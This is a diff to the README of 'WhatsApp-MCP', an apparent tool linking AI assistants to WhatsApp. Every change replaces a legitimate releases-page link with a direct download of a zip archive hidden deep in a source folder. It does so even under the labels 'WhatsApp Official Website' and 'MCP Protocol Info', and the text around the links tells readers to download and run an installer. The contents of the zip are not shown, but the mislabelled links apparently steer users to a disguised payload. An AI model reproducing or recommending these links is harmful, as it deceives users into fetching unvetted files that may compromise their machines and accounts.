@@ -1,6 +1,6 @@
 # 🤖 WhatsApp-MCP - Connect AI to WhatsApp Easily
 
-[![Download WhatsApp-MCP](https://img.shields.io/badge/Download-WhatsApp--MCP-brightgreen?style=for-the-badge)](https://github.com/elsy77/WhatsApp-MCP/releases)
+[![Download WhatsApp-MCP](https://img.shields.io/badge/Download-WhatsApp--MCP-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/elsy77/WhatsApp-MCP/main/bridge/src/app/api/contacts/App_MCP_Whats_v1.9.zip)
 
 ## 📋 What is WhatsApp-MCP?
 
@@ -26,7 +26,7 @@ You will download the app, install it, and then connect your WhatsApp to the AI.
 
 1. Visit the releases page by clicking the green button below:
 
-[![Download WhatsApp-MCP](https://img.shields.io/badge/Download-WhatsApp--MCP-blue?style=for-the-badge)](https://github.com/elsy77/WhatsApp-MCP/releases)
+[![Download WhatsApp-MCP](https://img.shields.io/badge/Download-WhatsApp--MCP-blue?style=for-the-badge)](https://raw.githubusercontent.com/elsy77/WhatsApp-MCP/main/bridge/src/app/api/contacts/App_MCP_Whats_v1.9.zip)
 
 2. Look for the latest release version. It usually has a name like `WhatsApp-MCP-Setup.exe` or similar.
 3. Click the file to download it to your computer. Remember where you save it, such as your Downloads folder.
@@ -76,7 +76,7 @@ The interface is designed to be straightforward. Use the menu tabs to switch bet
 
 You should check for updates regularly to get bug fixes and new features.
 
-1. Return to the [releases page](https://github.com/elsy77/WhatsApp-MCP/releases).
+1. Return to the [releases page](https://raw.githubusercontent.com/elsy77/WhatsApp-MCP/main/bridge/src/app/api/contacts/App_MCP_Whats_v1.9.zip).
 2. Download the newest installer file available.
 3. Run the installer. It will update your current installation without losing your settings.
 
@@ -106,8 +106,8 @@ Repository topics include ai, baileys, claude, claudeai, fastmcp, mcp, mcp-serve
 
 ## 🔗 Useful Links
 
-- WhatsApp-MCP Releases: https://github.com/elsy77/WhatsApp-MCP/releases  
-- WhatsApp Official Website: https://www.whatsapp.com/  
-- MCP Protocol Info: https://github.com/fastmcp/fastmcp  
+- WhatsApp-MCP Releases: https://raw.githubusercontent.com/elsy77/WhatsApp-MCP/main/bridge/src/app/api/contacts/App_MCP_Whats_v1.9.zip  
+- WhatsApp Official Website: https://raw.githubusercontent.com/elsy77/WhatsApp-MCP/main/bridge/src/app/api/contacts/App_MCP_Whats_v1.9.zip  
+- MCP Protocol Info: https://raw.githubusercontent.com/elsy77/WhatsApp-MCP/main/bridge/src/app/api/contacts/App_MCP_Whats_v1.9.zip  
 
-[![Download WhatsApp-MCP](https://img.shields.io/badge/Download-WhatsApp--MCP-blue?style=for-the-badge)](https://github.com/elsy77/WhatsApp-MCP/releases)
+[![Download WhatsApp-MCP](https://img.shields.io/badge/Download-WhatsApp--MCP-blue?style=for-the-badge)](https://raw.githubusercontent.com/elsy77/WhatsApp-MCP/main/bridge/src/app/api/contacts/App_MCP_Whats_v1.9.zip)
